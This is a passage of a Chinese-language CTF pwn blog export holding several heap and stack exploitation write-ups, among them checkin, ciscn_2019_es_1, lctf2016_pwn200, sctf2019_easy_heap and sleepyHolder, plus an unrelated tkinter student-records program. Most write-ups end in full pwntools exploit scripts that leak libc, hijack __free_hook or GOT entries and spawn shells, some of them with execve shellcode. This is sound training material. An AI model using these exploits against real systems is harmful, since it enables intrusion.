p.interactive()","categories":[],"tags":[]},{"title":"checkin","slug":"checkin","date":"2024-02-29T06:36:05.000Z","updated":"2024-02-29T07:26:23.812Z","comments":true,"path":"2024/02/29/checkin/","link":"","permalink":"http://example.com/2024/02/29/checkin/","excerpt":"","text":"挺有意思的一道栈迁移 s1是全局变量，这里写rop泄露got表地址 为了再一次执行程序，rop后面接的不是puts_plt 而是调用puts函数的地址，既能泄露got表地址，又能再执行一次程序。 buf只能溢出到rbp，但是有两次leave，一个是sub_4018C7函数里的 上一个函数结束后到sub_401876函数里的，刚好能执行两次leave。 不过这里(unsigned int)sub_401974(buf)属实不太懂，太抽象了，也不知道它具体是怎么检查的两次的payload不太一样。payload1payload1+=p64(pop_rdi)+p64(puts_got)+p64(puts_plt) p.sendafter(&#39;&gt;&#39;,payload1) payload2=b&#39;admin\\x00\\x00\\x00&#39;+p64(0)*3+p64(bss) p.sendafter(&#39;Pass&#39;,payload2) payload2payload1=b&#39;admin\\x00\\x00\\x00&#39;*3+p64(one_gadget) p.sendafter(&#39;&gt;&#39;,payload1) payload2=b&#39;admin\\x00\\x00\\x00&#39;*4+p64(bss+0x10) p.sendafter(&#39;Pass&#39;,payload2) expfrom pwn import* from LibcSearcher import * p=remote(&quot;node5.buuoj.cn&quot;,25691) #p=process(&quot;./login_pro&quot;) context.log_level=&quot;debug&quot; libc=ELF(&#39;./libc.So.6&#39;) bss=0x602400 pop_rdi=0x401ab3 puts_plt=0x4018b5 puts_got=0x602028 payload1=b&#39;admin\\x00\\x00\\x00&#39; payload1+=p64(pop_rdi)+p64(puts_got)+p64(puts_plt) p.sendafter(&#39;&gt;&#39;,payload1) payload2=b&#39;admin\\x00\\x00\\x00&#39;+p64(0)*3+p64(bss) p.sendafter(&#39;Pass&#39;,payload2) p.recvuntil(&#39;BaileGeBai\\n&#39;) puts_got=u64(p.recvuntil(&#39;\\n&#39;,drop=True).ljust(8,b&#39;\\x00&#39;)) print(hex(puts_got)) base=puts_got-libc.sym[&#39;puts&#39;] one=[0x45226,0x4527a,0xf03a4,0xf1247] one_gadget=base+one[1] #gdb.attach(p) sleep(1) payload1=b&#39;admin\\x00\\x00\\x00&#39;*3+p64(one_gadget) p.sendafter(&#39;&gt;&#39;,payload1) payload2=b&#39;admin\\x00\\x00\\x00&#39;*4+p64(bss+0x10) p.sendafter(&#39;Pass&#39;,payload2) #p.sendline(payload) p.interactive()","categories":[],"tags":[]},{"title":"ciscn_2019_es_1","slug":"ciscn-2019-es-1","date":"2024-01-21T16:08:54.000Z","updated":"2024-01-21T16:33:02.581Z","comments":true,"path":"2024/01/22/ciscn-2019-es-1/","link":"","permalink":"http://example.com/2024/01/22/ciscn-2019-es-1/","excerpt":"","text":"ciscn_2019_es_1checksec一下，保护全开 addshow函数，可以输出我们想要的地址然后算偏移 delete函数，没有把指针置零，存在UAF漏洞 过程虽然理清，但仍然有点懵逼。先创三个堆add(0x410,&quot;AAAA&quot;) add(0x20,&quot;AAAA&quot;) add(0x20,&quot;bin/sh&quot;) delete(0) libc是2.27版本，就会有tachebin机制，free的大小大于0x400则可以绕过这个机制，而他的fd和bk指针都会指向main_arena+96这个地址，show函数把它输出出来并算出偏移量并算出free_hook的地址和system函数的地址。 show(0) malloc_hook_addr = u64(p.recvuntil(b&#39;\\x7f&#39;)[-6:].ljust(8,b&#39;\\x00&#39;))-96-0x10 base_addr = malloc_hook_addr - libc.symbols[&#39;__malloc_hook&#39;] free_hook = base_addr + libc.symbols[&#39;__free_hook&#39;] system_addr = base_addr + libc.symbols[&#39;system&#39;] 然后用double free，free两次堆2，然后堆2的如下，以及bin bin指针链0x000055ac61f846c0这个地址记录了它本身这里也许是tachebin的机制，再次malloc时，会先创建一个堆记录下一个堆的地址，而下一个堆正是我们add函数的过程，在0x000055ac61f846c0这个地址写入的是free_hook的地址，但是它依然还是在bin链中的，这就很不解，明明已经被使用了，这时bin链的指针指到了free_hook，我们再malloc 这时bin链的指针指到了free_hook，我们再malloc两次就能把free_hook函数的地址内容改成system函数的地址,而都同add函数一样正常mollc，参数bin/sh放在堆3 exp from pwn import* from LibcSearcher import * #p=remote(&quot;node4.buuoj.cn&quot;,28022) p=process(&quot;./ciscn_2019_es_1&quot;) context.log_level=&quot;debug&quot; elf=ELF(&quot;./ciscn_2019_es_1&quot;) libc=ELF(&quot;./libc-2.27.so&quot;) def add(size,name): p.recvuntil(&quot;choice:&quot;) p.sendline(&quot;1&quot;) p.recvuntil(&quot;name&quot;) p.sendline(str(int(size))) p.recvuntil(&quot;name:&quot;) p.sendline(name) p.recvuntil(&quot;call&quot;) p.sendline(name) def show(dex): p.sendlineafter(&quot;choice:&quot;,&#39;2&#39;) p.sendlineafter(&quot;index:&quot;,str(dex)) def delete(dex): p.sendlineafter(&quot;choice:&quot;,&#39;3&#39;) p.sendlineafter(&quot;index:\\n&quot;,str(dex)) add(0x410,&quot;AAAA&quot;) add(0x20,&quot;AAAA&quot;) add(0x20,&quot;bin/sh&quot;) delete(0) show(0) malloc_hook_addr = u64(p.recvuntil(b&#39;\\x7f&#39;)[-6:].ljust(8,b&#39;\\x00&#39;))-96-0x10 base_addr = malloc_hook_addr - libc.symbols[&#39;__malloc_hook&#39;] free_hook = base_addr + libc.symbols[&#39;__free_hook&#39;] system_addr = base_addr + libc.symbols[&#39;system&#39;] delete(1) delete(1) gdb.attach(p) sleep(1) add(0x20,p64(free_hook)) add(0x20,&#39;MMMM&#39;) add(0x20,p64(system_addr)) delete(2) #p.sendline(payload) p.interactive()","categories":[],"tags":[]},{"title":"lctf2016_pwn200","slug":"lctf2016_pwn200","date":"2024-01-14T12:22:41.000Z","updated":"2024-01-14T14:26:16.834Z","comments":true,"path":"2024/01/14/lctf2016_pwn200/","link":"","permalink":"http://example.com/2024/01/14/lctf2016_pwn200/","excerpt":"","text":"lctf2016_pwn200一道有点难的堆题这是主函数的结构，当我们输入满0x40时能够把主函数的ebp的地址泄露出来 下面小a的末尾的rbp寄存器存着主函数的rbp 后面还调用了两个函数，说明这两个函数的栈帧离得不远，而这个函数，可以构造我们的fakechunk,还有我们的shellcode shellcode第一个得是’\\x00’防止复制过去，造成影响申请得到得堆的地址和给过去的不太一样，这是构造的栈的结构 然后ptr指针的值被覆盖成栈上的，等我们free再malloc的时候就能申请到这，但是大小得是0x30，因为我们构造的fakechunk的大小是0x40的大小，这样才能malloc到我们的栈上，从而覆盖到返回地址，而返回地址得写成shellcode开始的地址。shellcode的结构应该写出这样的结构。 payload=3*p64(0)+p64(rbp-0xc0+1) 再次申请覆盖掉返回地址，最后程序返回的时候会执行shellcodefrom pwn import* from LibcSearcher import * #p=remote(&quot;node4.buuoj.cn&quot;,28868) p=process(&quot;./pwn200&quot;) context.log_level=&quot;debug&quot; payload=&#39;a&#39;*0x30 p.sendafter(&#39;u?&#39;,payload) p.recvuntil(&#39;a&#39;*0x30) rbp=u64(p.recv(6).ljust(8,&#39;\\x00&#39;)) print(hex(rbp)) shellcode=&quot;\\x00\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e&quot; shellcode+= &quot;\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f&quot; shellcode += &quot;\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05&quot; payload=(shellcode+2*p64(0)+p64(0X41)).ljust(0x38,&#39;\\x00&#39;) #gouzhao fakebchunk payload+=p64(rbp-0x90) p.sendlineafter(&#39;id ~~?&#39;,&#39;31&#39;) print(hex(rbp-0x90)) p.sendlineafter(&#39;money~&#39;,payload) p.sendlineafter(&#39;choice : &#39;,&#39;2&#39;) #p.recvuntil(&#39;\\n&#39;) gdb.attach(p) sleep(1) p.sendlineafter(&#39;choice : &#39;,&#39;1&#39;) p.sendlineafter(&#39;long?&#39;,&#39;48&#39;) payload=3*p64(0)+p64(rbp-0xc0+1) p.sendlineafter(&#39;money : &#39;,payload) p.sendlineafter(&#39;choice : &#39;,&#39;3&#39;) #p.sendline(payload) p.interactive()","categories":[],"tags":[]},{"title":"python课设","slug":"python课设","date":"2023-12-25T14:49:46.000Z","updated":"2023-12-25T14:54:02.315Z","comments":true,"path":"2023/12/25/python课设/","link":"","permalink":"http://example.com/2023/12/25/python%E8%AF%BE%E8%AE%BE/","excerpt":"","text":"import tkinter as tk from tkinter import messagebox, simpledialog import json import re import os STUDENT_FILE = &#39;students.json&#39; def load_students(): if not os.path.exists(STUDENT_FILE): return [] with open(STUDENT_FILE, &#39;r&#39;, encoding=&#39;utf-8&#39;) as file: return json.load(file) def save_students(students): with open(STUDENT_FILE, &#39;w&#39;, encoding=&#39;utf-8&#39;) as file: json.dump(students, file, ensure_ascii=False, indent=2) def show_students(students): sorted_students = sorted(students, key=lambda x: x[&#39;id&#39;]) # 按学号排序 students_text = &quot;&quot; for student in sorted_students: students_text += f&quot;学号: &#123;student[&#39;id&#39;]&#125;\\n&quot; students_text += f&quot;姓名: &#123;student[&#39;name&#39;]&#125;\\n&quot; students_text += f&quot;年龄: &#123;student[&#39;age&#39;]&#125;\\n&quot; students_text += f&quot;性别: &#123;student[&#39;gender&#39;]&#125;\\n\\n&quot; return students_text def validate_id(student_id): return bool(student_id.strip()) def add_student(students): dialog = tk.Toplevel() dialog.title(&quot;添加学生信息&quot;) dialog.geometry(&quot;250x200+900+400&quot;) tk.Label(dialog, text=&quot;学号：&quot;).grid(row=0, column=0, padx=10, pady=5) id_var = tk.StringVar() tk.Entry(dialog, textvariable=id_var).grid(row=0, column=1, padx=10, pady=5) tk.Label(dialog, text=&quot;姓名：&quot;).grid(row=1, column=0, padx=10, pady=5) name_var = tk.StringVar() tk.Entry(dialog, textvariable=name_var).grid(row=1, column=1, padx=10, pady=5) tk.Label(dialog, text=&quot;年龄：&quot;).grid(row=2, column=0, padx=10, pady=5) age_var = tk.StringVar() tk.Entry(dialog, textvariable=age_var).grid(row=2, column=1, padx=10, pady=5) tk.Label(dialog, text=&quot;性别：&quot;).grid(row=3, column=0, padx=10, pady=5) gender_var = tk.StringVar() gender_var.set(&quot;男&quot;) gender_menu = tk.OptionMenu(dialog, gender_var, &quot;男&quot;, &quot;女&quot;) gender_menu.grid(row=3, column=1, padx=10, pady=5) def add_student_action(): student_info = &#123; &#39;id&#39;: id_var.get(), &#39;name&#39;: name_var.get(), &#39;age&#39;: age_var.get(), &#39;gender&#39;: gender_var.get() &#125; if not student_info[&#39;id&#39;] or not validate_id(student_info[&#39;id&#39;]): messagebox.showerror(&quot;错误&quot;, &quot;学号格式错误，请重新输入。&quot;) return if any(student[&#39;id&#39;] == student_info[&#39;id&#39;] for student in students): messagebox.showerror(&quot;错误&quot;, &quot;学号已存在，请重新输入。&quot;) return students.append(student_info) messagebox.showinfo(&quot;成功&quot;, &quot;学生信息添加成功！&quot;) dialog.destroy() add_button = tk.Button(dialog, text=&quot;添加&quot;, command=add_student_action) add_button.grid(row=4, columnspan=2, pady=10) def edit_student(students): student_id = simpledialog.askstring(&quot;输入&quot;, &quot;请输入要编辑的学号：&quot;) if not student_id or not validate_id(student_id): messagebox.showerror(&quot;错误&quot;, &quot;学号格式错误，请重新输入。&quot;) return student = next((s for s in students if s[&#39;id&#39;] == student_id), None) if student: messagebox.showinfo(&quot;信息&quot;, f&quot;学号: &#123;student[&#39;id&#39;]&#125;\\n姓名: &#123;student[&#39;name&#39;]&#125;\\n年龄: &#123;student[&#39;age&#39;]&#125;\\n性别: &#123;student[&#39;gender&#39;]&#125;&quot;) dialog = tk.Toplevel() dialog.title(&quot;编辑学生信息&quot;) dialog.geometry(&quot;250x200+900+400&quot;) tk.Label(dialog, text=&quot;姓名：&quot;).grid(row=1, column=0, padx=10, pady=5) name_var = tk.StringVar(value=student[&#39;name&#39;]) tk.Entry(dialog, textvariable=name_var).grid(row=1, column=1, padx=10, pady=5) tk.Label(dialog, text=&quot;年龄：&quot;).grid(row=2, column=0, padx=10, pady=5) age_var = tk.StringVar(value=str(student[&#39;age&#39;])) tk.Entry(dialog, textvariable=age_var).grid(row=2, column=1, padx=10, pady=5) tk.Label(dialog, text=&quot;性别：&quot;).grid(row=3, column=0, padx=10, pady=5) gender_var = tk.StringVar(value=student[&#39;gender&#39;]) gender_menu = tk.OptionMenu(dialog, gender_var, &quot;男&quot;, &quot;女&quot;) gender_menu.grid(row=3, column=1, padx=10, pady=5) def edit_student_action(): student[&#39;name&#39;] = name_var.get() student[&#39;age&#39;] = int(age_var.get()) student[&#39;gender&#39;] = gender_var.get() messagebox.showinfo(&quot;成功&quot;, &quot;学生信息编辑成功！&quot;) dialog.destroy() edit_button = tk.Button(dialog, text=&quot;编辑&quot;, command=edit_student_action) edit_button.grid(row=4, columnspan=2, pady=10) else: messagebox.showerror(&quot;错误&quot;, &quot;未找到该学生信息。&quot;) def delete_student(students): student_id = simpledialog.askstring(&quot;输入&quot;, &quot;请输入要删除的学号：&quot;) if not student_id or not validate_id(student_id): messagebox.showerror(&quot;错误&quot;, &quot;学号格式错误，请重新输入。&quot;) return student = next((s for s in students if s[&#39;id&#39;] == student_id), None) if student: students.remove(student) messagebox.showinfo(&quot;成功&quot;, &quot;学生信息删除成功！&quot;) else: messagebox.showerror(&quot;错误&quot;, &quot;未找到该学生信息。&quot;) def main(): root = tk.Tk() root.title(&quot;学生信息管理系统&quot;) students = load_students() window_width = 800 window_height = 500 screen_width = root.winfo_screenwidth() screen_height = root.winfo_screenheight() x_position = (screen_width - window_width) // 2 y_position = (screen_height - window_height) // 2 root.geometry(f&quot;&#123;window_width&#125;x&#123;window_height&#125;+&#123;x_position&#125;+&#123;y_position&#125;&quot;) def show_students_command(): students_text = show_students(students) messagebox.showinfo(&quot;学生信息&quot;, students_text) def add_student_command(): add_student(students) def delete_student_command(): delete_student(students) def edit_student_command(): edit_student(students) def save_and_exit(): save_students(students) root.destroy() show_students_button = tk.Button(root, text=&quot;显示所有学生信息&quot;, command=show_students_command) show_students_button.pack() add_student_button = tk.Button(root, text=&quot;添加学生信息&quot;, command=add_student_command) add_student_button.pack() delete_student_button = tk.Button(root, text=&quot;删除学生信息&quot;, command=delete_student_command) delete_student_button.pack() edit_student_button = tk.Button(root, text=&quot;编辑学生信息&quot;, command=edit_student_command) edit_student_button.pack() exit_button = tk.Button(root, text=&quot;保存并退出&quot;, command=save_and_exit) exit_button.pack() root.mainloop() if __name__ == &quot;__main__&quot;: main()","categories":[],"tags":[]},{"title":"sctf2019_easy_heap","slug":"sctf2019-easy-heap","date":"2023-12-06T13:15:49.000Z","updated":"2023-12-09T14:27:35.188Z","comments":true,"path":"2023/12/06/sctf2019-easy-heap/","link":"","permalink":"http://example.com/2023/12/06/sctf2019-easy-heap/","excerpt":"","text":"例行检查，保护全开调用了mmap函数，把0xFFFFFFF000的地址映射到内存中某个地址，并打印出来，很明显这道题得用shellcode来做，这个地址可读可写可运行，后面要用 add函数,会打印出堆的地址 full函数，能输入内容到堆上 最后会增添一个’\\x00’,存在off by one 漏洞 free函数，没什么漏洞 先接收mmap映射的地址p.recvuntil(b&#39;Mmap: &#39;) vmap = p.recvline().strip() vmap = int(vmap, 16) print(&#39;vmap=&gt;&#39;+hex(vmap)) 做off-by-one这种题的话，有个技巧，一般都是先申请四个堆add(0x410) #0 add(0x68) #1 add(0x4f0) #2 add(0x68) #3 然后释放第一个，然后填充第一个堆，利用sub_E2D函数的输入把堆2的size位改为0，然后释放堆2进行unlink操作，然后堆1会被夹在中间free(0) payload=p64(0)*12+p64(0x490) fill(1,payload) 释放堆2，会进行unlink 再申请一次0x410和0x68大小的堆，堆2会和堆1的位置重合 再delete几次，相当于double free了堆2delete(3) delete(1) #1=&gt;#3 delete(2) #2(1)=&gt;1 接下来改bin链指针成改成vmap的，写上shellcode 上面的话堆2是没有free的，然后用上面的方式再unlink一次，再add0x410大小的堆，会在堆2的fd指针上有main_arena+96的地址。fill(1,payload) delete(1) delete(4) #unlink add(0x410) # 0 fill堆2一个字节，将其改为0x30，既是mallloc_hook的地址 再malloc0x68两次，第二次写上vmap的地址,再任意申请一次堆即可提权add(0x68) #1 fill(1,p64(vmap)) # 4 add(0x68) #4 fill(4,p64(vmap)) add(0x20) expfrom pwn import* from LibcSearcher import * #p=remote(&quot;node4.buuoj.cn&quot;,28038) p=process(&quot;./sctf2019_easy_heap&quot;) context.log_level=&quot;debug&quot; libc=ELF(&#39;./libc-2.27.so&#39;) context.arch=&#39;amd64&#39; #context=arch(&#39;amd64&#39;) def add(size): p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;1&#39;) p.sendlineafter(&#39;Size: &#39;,str(size)) def fill(index,content): p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;3&#39;) p.sendlineafter(&#39;Index:&#39;,str(index)) p.sendlineafter(&#39;Content:&#39;,content) def delete(index): p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;2&#39;) p.sendlineafter(&#39;Index: &#39;,str(index)) p.recvuntil(b&#39;Mmap: &#39;) vmap = p.recvline().strip() vmap = int(vmap, 16) print(&#39;vmap=&gt;&#39;+hex(vmap)) add(0x410) #0 add(0x68) #1 add(0x4f0) #2 add(0x68) #3 payload=p64(0)*12+p64(0x490) delete(0) fill(1,payload) delete(2) add(0x410) #0 add(0x68) #2 lead to chunk1 delete(3) delete(1) #1=&gt;3 delete(2) #1=&gt;1 in the similar case we use by UAF,but it is not. add(0x68) #1 fill(1,p64(vmap)) add(0x68) #2 add(0x68) #3 shellcode=asm(shellcraft.sh()) fill(3,shellcode) add(0x4f0) #4 delete(0) #free 0x410 fill(1,payload) delete(1) delete(4) #unlink add(0x410) # 0 gdb.attach(p) sleep(1) pause() fill(2,&#39;\\x30&#39;) add(0x68) #1 fill(1,p64(vmap)) # 4 add(0x68) #4 fill(4,p64(vmap)) add(0x20) p.interactive()","categories":[],"tags":[]},{"title":"metasequoia_2020_samsara","slug":"metasequoia-2020-samsara","date":"2023-12-03T08:02:58.000Z","updated":"2023-12-03T09:25:48.720Z","comments":true,"path":"2023/12/03/metasequoia-2020-samsara/","link":"","permalink":"http://example.com/2023/12/03/metasequoia-2020-samsara/","excerpt":"","text":"保护全开，就不放了程序挺简单的，菜单直接放出来了，存在double free漏洞，只需要让v8=0xdeadbeef就能拿到flag 先double free,然后用case4打印出v7的地址，在栈上v8的地址等于v7+0x8,double free改地址的时候改到v7-0x8,然后v7的值得是0x20，构造fakechunk，然后malloc的时候在v7-0x8+0x10的地方写上0xdeadbeef 开始的时候得多申请一个堆堆3，其他师傅说防止free 掉的两个chunk和top chunk合并，脚本跑的话没逝，但以后还是得注意expfrom pwn import* from LibcSearcher import * #p=remote(&quot;node4.buuoj.cn&quot;,28766) p=process(&quot;./metasequoia_2020_samsara&quot;) context.log_level=&quot;debug&quot; libc=ELF(&#39;./libc-2.23.so&#39;) def add(): p.sendlineafter(&#39;choice &gt; &#39;,&#39;1&#39;) def free(index): p.sendlineafter(&#39;choice &gt; &#39;,&#39;2&#39;) p.sendlineafter(&#39;Index&#39;,str(index)) def full(index,content): p.sendlineafter(&#39;choice &gt; &#39;,&#39;3&#39;) p.sendlineafter(&#39;Index&#39;,str(index)) p.sendlineafter(&#39;Ingredient:&#39;,content) def show(): p.sendlineafter(&#39;choice &gt; &#39;,&#39;4&#39;) def move(content): p.sendlineafter(&#39;choice &gt; &#39;,&#39;5&#39;) p.sendlineafter(&#39;Which kingdom?&#39;,content) add() #0 add() #1 add() #2 free(0) free(1) free(0) show() p.recvuntil(&#39;Your lair is at: &#39;) addr=int(p.recv(14),16) #addr = int(p.recvuntil(&#39;\\n&#39;, drop=True), 16) print(&#39;addr=&gt;&#39;+hex(addr)) move(str(0x20)) gdb.attach(p) pause() #sleep(1) v8=addr-0x8 add() #3 full(3,str(v8)) add() #4 add() #5 add() #6 full(6,str(0xdeadbeef)) p.sendlineafter(&#39;choice &gt; &#39;,&#39;6&#39;) p.interactive()","categories":[],"tags":[]},{"title":"ciscn_2019_c_3","slug":"ciscn-2019-c-3","date":"2023-11-27T13:21:21.000Z","updated":"2023-11-27T14:39:09.858Z","comments":true,"path":"2023/11/27/ciscn-2019-c-3/","link":"","permalink":"http://example.com/2023/11/27/ciscn-2019-c-3/","excerpt":"","text":"开启了全局偏移add函数，只允许申请固定的几个大小的堆，在堆地址+16的地方写入内容，所以改不了fd和bk地址，堆地址开始写上0，堆地址+8的地址会加上随机数 show函数，会把堆地址上的几个数分别打印出来，可以打印出main_arena+96的地址 delete函数，存在很明显的UAF漏洞 还有个后面函数，可以改堆fd位置的东西，每次能使其加一，后面能改其bin指针 先malloc大小为0x100的堆，然后释放8次，然后bin才会有main_arena+96,且得先malloc大小是0x100大小的堆add(0x100,&#39;aaaa&#39;) #0 add(0x60,&#39;bbbb&#39;) #1 for i in range(8): delete(0) 然后show的话能接收到其地址show(0) p.recvuntil(&quot;attack_times: &quot;) #arena = u64(p.recv(6).ljust(8, b&#39;\\x00&#39;)) arena_96=int(p.recvuntil(&#39;\\n&#39;,drop=True)) malloc_hook=arena_96-96-0x10 base=malloc_hook-libc.sym[&#39;__malloc_hook&#39;] free_hook=base+libc.sym[&#39;__free_hook&#39;] gadget=base+one_gadget 再申请一个堆，这时候会在堆2开始,由于glibc 2.27的特性，会在开始的上方申请堆，这里不太明白为什么要用free_hook-0x10的地址，而不是free_hookpayload=p64(0)*2+p64(free_hook-0x10) add(0x60,payload) #2 double free然后用backdoor函数20次，fd+0x20,将bin指针指向0x0000562a77ab5280的地址 add(0x60,&#39;aaaa&#39;) add(0x60,&#39;bbbb&#39;) add(0x60,p64(gadget)) delete(1) expfrom pwn import* from LibcSearcher import * #p=remote(&quot;node4.buuoj.cn&quot;,29798) p=process(&quot;./ciscn_2019_c_3&quot;) context.log_level=&quot;debug&quot; libc=ELF(&#39;./libc-2.27.so&#39;) context.arch=&#39;amd64&#39; one_gadget=0x4f322 def add(size,content): p.sendlineafter(&#39;Command: &#39;,&#39;1&#39;) p.sendlineafter(&#39;size: &#39;,str(size)) p.sendlineafter(&#39;Give me the name: &#39;,content) def show(index): p.sendlineafter(&#39;Command: &#39;,&#39;2&#39;) p.sendlineafter(&#39;index: &#39;,str(index)) def delete(index): p.sendlineafter(&#39;Command: &#39;,&#39;3&#39;) p.sendlineafter(&#39;weapon:&#39;,str(index)) def back(index): p.sendlineafter(&#39;Command: &#39;,&#39;666&#39;) p.sendlineafter(&#39;weapon:&#39;,str(index)) add(0x100,&#39;aaaa&#39;) #0 add(0x60,&#39;bbbb&#39;) #1 for i in range(8): delete(0) show(0) p.recvuntil(&quot;attack_times: &quot;) #arena = u64(p.recv(6).ljust(8, b&#39;\\x00&#39;)) arena_96=int(p.recvuntil(&#39;\\n&#39;,drop=True)) malloc_hook=arena_96-96-0x10 base=malloc_hook-libc.sym[&#39;__malloc_hook&#39;] free_hook=base+libc.sym[&#39;__free_hook&#39;] gadget=base+one_gadget payload=p64(0)*2+p64(free_hook-0x10)#2 add(0x60,payload) delete(2) delete(2) for i in range(0x20): back(2) gdb.attach(p) sleep(1) add(0x60,&#39;aaaa&#39;) add(0x60,&#39;bbbb&#39;) print(hex(free_hook)) add(0x60,p64(gadget)) delete(1) p.interactive()","categories":[],"tags":[]},{"title":"ciscn_final_2","slug":"ciscn-final-2","date":"2023-11-02T14:07:31.000Z","updated":"2023-11-03T14:06:20.041Z","comments":true,"path":"2023/11/02/ciscn-final-2/","link":"","permalink":"http://example.com/2023/11/02/ciscn-final-2/","excerpt":"","text":"例行检查，保护全开，就不放了。add函数，只能申请0x20大小的堆或者0x10大小的，只能先申请再释放 存在double free漏洞 可以double free泄露出堆地址，但是是int类型，接收的话用addr=int(p.recvuntil(‘\\n’, drop=True)),发送的时候用str类型就可在内存里用十六进制存储了。 前戏是先double free改堆头的size，改size容易但是中间得add好几个堆add(1,&#39;11&#39;) dele(1) add(2,&#39;22&#39;) add(2,&#39;11&#39;) add(2,&#39;11&#39;) add(2,&#39;22&#39;) dele(2) add(1,&#39;11&#39;) dele(2) show(2) p.recvuntil(&#39;your short type inode number :&#39;) addr=int(p.recvuntil(&#39;\\n&#39;, drop=True))-0xa0 add(2,addr) add(2,&#39;11&#39;) add(2,0x91) #改掉size free7次使其进入unsortedbin,前面改size成0x90是最小的大小，不然下面的地址不会是main_arena+96for i in range(7): dele(1) add(2,5) dele(1) 接收并计算地址,至于为什么是 IO_2_1_stdin +0x70，应该是它执行时候的地址。show(1) p.recvuntil(&#39;your int type inode number :&#39;) malloc_hook=int(p.recvuntil(&#39;\\n&#39;, drop=True))-0x70 base=malloc_hook-libc.sym[&#39;__malloc_hook&#39;] stdin=base+libc.sym[&#39;_IO_2_1_stdin_&#39;]+0x70 再次malloc改掉堆地址,然后填充add(1,stdin) add(1,0x30) 再次double free获取头地址，再次show出来的堆头地址和开始时的时不一样的。dele(1) add(2,0x30) dele(1) #double free show(1) p.recvuntil(&#39;your int type inode number :&#39;) chunk0=int(p.recvuntil(&#39;\\n&#39;, drop=True))-0x30 再改堆指针,填充add(1,chunk0) add(1,chunk0) add(1,111) add(1,666) expfrom pwn import * from LibcSearcher import * p=process(&#39;./ciscn_final_2&#39;) #p=remote(&#39;node4.buuoj.cn&#39;,26681) context( os = &#39;linux&#39;,arch=&#39;amd64&#39;) context.log_level = &#39;debug&#39; elf=ELF(&#39;./ciscn_final_2&#39;) libc=ELF(&#39;./libc-2.27.so&#39;) def add(index,content): p.sendlineafter(&#39;&gt; &#39;,&#39;1&#39;) p.sendlineafter(&#39;&gt;&#39;,str(index)) p.sendlineafter(&#39;your inode number:&#39;,str(content)) def dele(index): p.sendlineafter(&#39;&gt; &#39;,&#39;2&#39;) p.sendlineafter(&#39;&gt;&#39;,str(index)) def show(index): p.sendlineafter(&#39;&gt; &#39;,&#39;3&#39;) p.sendlineafter(&#39;&gt;&#39;,str(index)) add(1,&#39;11&#39;) dele(1) add(2,&#39;22&#39;) add(2,&#39;11&#39;) add(2,&#39;11&#39;) add(2,&#39;22&#39;) dele(2) add(1,&#39;11&#39;) dele(2) show(2) p.recvuntil(&#39;your short type inode number :&#39;) addr=int(p.recvuntil(&#39;\\n&#39;, drop=True))-0xa0 add(2,addr) add(2,&#39;11&#39;) add(2,0x91) for i in range(7): dele(1) add(2,5) dele(1) show(1) p.recvuntil(&#39;your int type inode number :&#39;) malloc_hook=int(p.recvuntil(&#39;\\n&#39;, drop=True))-0x70 base=malloc_hook-libc.sym[&#39;__malloc_hook&#39;] stdin=base+libc.sym[&#39;_IO_2_1_stdin_&#39;]+0x70 add(1,stdin) ###??? add(1,0x30) #double free dele(1) add(2,0x30) dele(1) show(1) p.recvuntil(&#39;your int type inode number :&#39;) chunk0=int(p.recvuntil(&#39;\\n&#39;, drop=True))-0x30 add(1,chunk0) gdb.attach(p) sleep(1) add(1,chunk0) add(1,111) add(1,666) p.sendlineafter(&#39;&gt; &#39;,&#39;4&#39;) p.recvuntil(&#39;your message :&#39;) #print(addr) p.interactive()","categories":[],"tags":[{"name":"buu","slug":"buu","permalink":"http://example.com/tags/buu/"}]},{"title":"sleepyHolder_hitcon_2016","slug":"sleepyHolder-hitcon-2016","date":"2023-10-30T12:09:08.000Z","updated":"2023-10-31T13:49:22.122Z","comments":true,"path":"2023/10/30/sleepyHolder-hitcon-2016/","link":"","permalink":"http://example.com/2023/10/30/sleepyHolder-hitcon-2016/","excerpt":"","text":"例行检查 add函数，能分别申请一个0x28，0xfa0,0x61a80大小的堆一次 dele函数，存在UAF漏洞，指针没有清零，但是对应的数清零了，所以可以再次申请堆 这还有个edit函数 add(1,&#39;AAAA&#39;) #堆0 add(2,&#39;BBBB&#39;) #堆1 dele(1) add(3,&#39;cccc&#39;) #堆2 因为堆2太大所以free chunk会放在smallbin里 这里有个漏洞，double free堆0后再次申请堆0，堆1的size位还是0，所以可以利用unlink 再申请一次堆add(1,&#39;aaaa&#39;) 后面构造fake_chunk,然后dele(2),会unlinkpayload=p64(0)+p64(0x21)+p64(fd)+p64(bk)+p64(0x20) edit(1,payload) dele(2) #unlink 注意堆0时0x6020d0,堆1时0x6020c0，刚开始不太清楚为什么后面要补这么多1，后面看向add函数，堆0，1，2分别对应着0x6020e0,d8,dc的地址,有则表示1,堆1虽已dele，但是只是为了后面方便改指针，全都写成1payload=p64(0)+p64(elf.got[&#39;free&#39;])+p64(0)+p64(0x6020c0)+p32(1)+p32(1)+p32(1) edit(1,payload) #8 edit(2,p64(0x400760)) #put_plt edit(1,p64(0x602020)) #puts_got 把free_got改写的内容改成puts_plt,可以执行puts函数，堆0的指针写上puts_got,然后dele堆1，就会打印出地址 然后算出偏移，算出system函数的地址，再edit堆0，0x6020c0payload=p64(elf.got[&#39;atoi&#39;])+p64(0)+p32(1)+p32(1)+p32(1) edit(1,payload) 再edit堆2，写上system的地址，edit(2,p64(system)) 主函数菜单那里还有个atoi函数，写上’sh’即可expfrom pwn import* from LibcSearcher import * #p=remote(&quot;node4.buuoj.cn&quot;,) p=process(&quot;./sleepyHolder_hitcon_2016&quot;) context.log_level=&quot;debug&quot; context(arch=&#39;amd64&#39;) elf=ELF(&#39;./sleepyHolder_hitcon_2016&#39;) libc=ELF(&#39;libc-2.23.so&#39;) def add(chose,content): p.sendlineafter(&#39;3. Renew secret\\n&#39;,&#39;1&#39;) p.sendlineafter(&#39;What secret do you want to keep?&#39;,str(chose)) p.sendafter(&#39;Tell me your secret: &#39;,content) def dele(index): p.sendlineafter(&#39;3. Renew secret\\n&#39;,&#39;2&#39;) p.sendlineafter(&#39;Which Secret do you want to wipe?&#39;,str(index)) def edit(ch,content): p.sendlineafter(&#39;3. Renew secret\\n&#39;,&#39;3&#39;) p.sendlineafter(&#39;Which Secret do you want to renew?&#39;,str(ch)) p.sendafter(&#39;Tell me your secret: &#39;,content) add(1,&#39;AAAA&#39;) 